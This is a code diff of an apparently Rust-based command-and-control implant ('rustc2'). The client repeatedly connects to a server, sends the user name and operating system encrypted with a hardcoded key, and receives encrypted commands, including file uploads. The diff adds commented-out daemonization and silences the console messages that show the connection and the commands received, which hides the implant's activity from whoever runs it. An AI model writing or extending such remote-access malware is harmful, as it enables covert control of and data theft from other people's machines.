@@ -6,10 +6,21 @@ use std::{thread,
     collections::HashMap};
 use clap::{Command, arg};
 use simple_crypt::{decrypt, encrypt};
+// use daemonize::Daemonize;
 mod utils;
 
 use utils::ImportedScript;
 fn main() {
+    // let daemonize = Daemonize::new()
+    //     .pid_file("/tmp/rustc2.pid") // Specify the PID file
+    //     .chown_pid_file(true) // Change the ownership of the PID file
+    //     .working_directory("/tmp"); // Change the working directory
+
+    // match daemonize.start() {
+    //     Ok(_) => println!("Daemonized successfully"),
+    //     Err(e) => eprintln!("Error, {}", e),
+    // }
+
     let mut host = "127.0.0.1".to_string();
     let mut port = "8080".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
@@ -34,7 +45,7 @@ fn main() {
     loop {
         match TcpStream::connect(format!("{}:{}", host, port)) {
             Ok(mut stream) =>  {
-                println!("Successfully connected to the server");
+                // println!("Successfully connected to the server");
                 let outinfo = format!("||ACSINFO||{}||{}\r\n", username, os);
                 let encrypted_data = encrypt(outinfo.as_bytes(), b"shared secret").expect("Failed to encrypt");
                 stream.write(&encrypted_data).unwrap();
@@ -50,7 +61,7 @@ fn main() {
                     let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
                     let command = String::from_utf8(data.to_vec()).unwrap();
                     let command_clone = command.clone();
-                    print!("\rReceived command from server: {}", command);
+                    // print!("\rReceived command from server: {}", command);
                     std::io::stdout().flush().unwrap();
                     let stream_to_use = &mut stream;
                     if command_clone.starts_with("||UPLOAD||") {
